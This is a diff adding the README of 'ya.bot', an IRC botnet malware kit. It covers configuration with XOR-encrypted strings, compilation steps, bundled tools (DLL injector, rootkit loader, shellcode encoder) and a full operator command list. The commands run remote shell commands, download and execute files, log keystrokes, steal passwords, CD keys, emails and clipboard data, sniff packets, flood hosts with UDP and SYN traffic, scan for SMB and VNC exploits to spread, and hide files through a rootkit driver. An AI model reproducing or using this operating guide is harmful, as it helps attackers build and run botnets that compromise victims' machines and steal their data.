@@ -1,0 +1,262 @@
+/*  ya.bot  */
+
+
+
+
+[TABLE OF CONTENTS]
+
+
+[1.0]
+- [1.1] ABOUT
+- [1.2] LICENSE
+- [1.3] RULES
+
+[2.0]
+- [2.1] CONFIGURING
+- [2.2] COMPILING
+
+[3.0]
+- [3.1] TOOLS
+- [3.2] COMMANDS
+
+
+
+
+[1.0]
+- [1.1] ABOUT
+
+THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
+IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
+OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
+IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
+PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
+OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
+WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
+OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
+ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+
+- [1.2] LICENSE
+
+Redistribution and use in binary forms, with or without modification,
+are permitted provided that the following conditions are met:
+
+1. The name of the author may not be used to endorse or promote products
+derived from this software without specific prior written permission.
+2. The binary may not be sold and/or given away for free.
+3. The licensee may only create binaries for his own usage, not for any
+third parties.
+
+Redistribution and use in source forms, with or without modification,
+are not permitted.
+
+
+- [1.3] RULES
+
+1. Die.
+
+
+
+
+[2.0]
+- [2.1] CONFIGURING
+
+1. Open current/tools/other/crypto.exe
+2. Choose "xor + hex §_§".
+2. Set the XOR key to the same as in config.h (969), where it says "231".
+If you choose to change the XOR key in config.h, you will have to change
+all the encrypted strings in the source.
+3. Write the text you want the program to encrypt for you, where it says
+"value", and add it to config.h.
+4. For Username and Password use the "elf hash  ~_~" option.
+
+
+- [2.2] COMPILING
+
+1. Get and install Microsoft Visual Studio 6.0.
+2. Get and install Visual Studio Service Pack 5 (*).
+3. Get and install Visual Studio Processor Pack (**).
+4. Get and install Platform SDK (***).
+5. Get and install WINDDK (****).
+5. Open Visual Studio and open:
+Tools|Options...|Directories
+Add these directories ON TOP of the list (use the "UP" arrow):
+
+Show directories for|Executable files:
+<sdk path>\Bin
+
+Show directories for|Include files:
+<sdk path>\include
+
+Show directories for|Library files:
+<sdk path>\Lib
+6.Compile.
+
+The software has been tested sucessfully in runtime on the
+following systems:
+Windows 2000 Professional SP0.
+Windows 2000 Professional SP2.
+Windows 2000 Professional SP3.
+Windows 2000 Professional SP4.
+Windows XP Home SP1.
+Windows XP Home SP2.
+Windows XP Professional SP0.
+Windows XP Professional SP1.
+Windows XP Professional SP2.
+
+(*)    http://msdn.microsoft.com/vstudio/downloads/updates/sp/vs6/sp5/
+(**)   http://msdn.microsoft.com/vstudio/downloads/tools/ppack/default.aspx
+(***)  http://www.microsoft.com/msdownload/platformsdk/sdkupdate/
+(****) http://www.microsoft.com/whdc/devtools/ddk/default.mspx
+
+
+
+
+[3.0]
+- [3.1] TOOLS
+
+other:
+------------
+crypto.exe - XOR/ELF Hash encrypter/decrypter. - GUI
+hexdump.exe - Dumps a file to hexcode. - CLI
+inject.exe - Injects a DLL to a remote process. - CLI
+loader.exe - Rootkit loader/unloader. - CLI
+service.exe - Service installer/uninstaller. - CLI
+
+shellcode:
+------------
+arwin.exe - Finds address of function in specific dll.- CLI
+encoder.exe - XOR encodes shellcode. - CLI
+findjmp.exe - Finds useful jump points in specific dll. - CLI
+hash.exe - Calculates hash of function name. - CLI
+makeshell.exe - Extracts shellcode from file. - CLI
+nasmw.exe - To compile shellcode with. - CLI
+
+
+- [3.2] COMMANDS
+
+bot.login <password> = logs you in.
+bot.die = kills bot.
+bot.disconnect <time in sec> = disconnects, sleeps for selected amount of time in seconds then
+reconnects.
+bot.dns <host/ip> = resolves host/ip.
+bot.info = shows bot info.
+bot.logout = logs you out.
+bot.raw <buffer> = sends raw buffer to irc server.
+bot.remove <botpassword> = removes bot.
+bot.system <command> = executes system command (cmd.exe).
+
+dcc.send <nick> <filepath> = DCCs file to user.
+dcc.stop = stops any running dcc thread.
+
+file.delete <filepath> = deletes file.
+file.find <filename> <directory> <subdirectories 0/1> = searches for file, supports wildcards.
+file.open <filepath> = opens file.
+
+ftp.download <host> <port> <user> <password> <remotefile> <localfile> <execute 0/1> = downloads
+file through ftp.
+ftp.update <host> <port> <user> <password> <remotefile> <botpassword> = updates bot through ftp.
+ftp.upload <host> <port> <user> <password> <localfile> <remotefile> = uploads file throught ftp.
+
+http.download <url> <filepath> <execute 0/1> = downloads file through http. 
+http.update <url> <botpassword> = updates bot through http.
+http.visit <url> = visits url.
+
+info.net = shows network info.
+info.sys = shows system info.
+
+keylog.sign = starts signature keylogger. (*)
+keylog.start = starts regular keylogger. (*)
+keylog.stop = stops keylogger.
+
+logic.if <match> <parameter> <command> = if conditions match then perform command (**). 
+
+process.killpid <pid> = kills process by pid.
+process.list = lists running processes.
+process.start <filepath> <visibility 0/1> = starts process.
+
+psniff.start = starts packet sniffer.
+psniff.stop = stops packet sniffer.
+
+speedtest.http = performs http speedtest and gets upload speed.
+
+thread.kill <thread> = kills thread.
+thread.list = lists running threads.
+
+socks4d.start <port> = starts socks4 daemon on chosen port.
+socks4d.stop = stops socks4 daemon.
+
+ddos.bandwith <url> <delay in ms> <times> = starts bandwith flood.
+ddos.stop = stops any running flood attacks.
+ddos.synack <host> <port> <delay in ms> <time in min> = starts SYN/ACK flood.
+ddos.troll <host> <port> <sockets> <delay in ms> <time in min> = starts troll flood.
+ddos.udp <host> <port> <delay in ms> <time in min> = starts udp flood.
+
+botkiller.start = starts botkiller.
+botkiller.stop = stops botkiller.
+
+expscan.cip = shows current ip beeing scanned.
+expscan.start <ip> <exploit/port> <sockets> <delay in sec> <time in min> [random] =
+starts exploit scan (***).
+expscan.stop = stops exploit scan.
+mircscan.start <delay in sec> <time in min> <message> = starts mIRC scan.
+mircscan.stop = stops mIRC scan.
+usbscan.start = <filename> <delay in sec> <time in min> = starts USB scan.
+usbscan.stop = stops USB scan.
+scan.stats = transfer statistics, if 0 no reply.
+
+snag.cdkeys = gets cd-keys.
+snag.clipboard = gets clipboard data.
+snag.emails = gets e-emails.
+snag.msn = gets msn user info.
+snag.storage = gets passwod storage data.
+
+wormride.start <time in min> = loads wormride into all running processes.
+wormride.stop = unloads wormride from all running processes.
+
+-d = Add after any command and bot will do a random delay between 0-120sec before executing
+command. Good if you dont want 4k bots updating from same source at the exact same time.
+-s = Add after any command and bot will execute command silently.
+-v = Add after any command and bot will give extra verbose info.
+
+(*) keylog:
+-------------
+note: keylogger wont work if bot is run as a service, due to the service running in a different
+user context!
+
+(**) logic:
+----------
+cpu <cpu_mhz> = executes <command> if cpu speed matches or is more.
+disk <free_mb> = executes <command> if free disk space matches or is more.
+host <host> = executes <command> if host matches, supports wildcards.
+id <id> = executes <command> if id matches, supports wildcards.
+ip <ip> = executes <command> if ip matches, supports wildcards.
+nick <nick> = executes <command> if nick matches, supports wildcards.
+ram <ram_mb> = executes <command> if total ram matches or is more.
+uptime <days> = executes <command> if amount of uptime days matches or is more.
+
+(***) expscan:
+-------------
+<ip> = start ip, do -a, -b or -c if you want to scan the bots own range.
+<exploit/port> = exploit/port to scan.
+<sockets> = number of sockets to use.
+<delay in sec> = time to wait for response in seconds.
+<time in min> = time to scan in minutes.
+[random] = add -r here to do a random scan, optional.
+
+ftp
+myudf
+realvnc
+smb139
+smb445
+smtp
+
+-a = bots own range, 192.168.1.0.
+-b = bots own range, 192.168.0.0.
+-c = bots own range, 192.0.0.0.
+-r = random, replaces 0s in IP with random numbers.
+
+driver:
+-------
+any files or processes prefixed with _temp_, e.g _temp_svchost.exe, will be hidden from user.
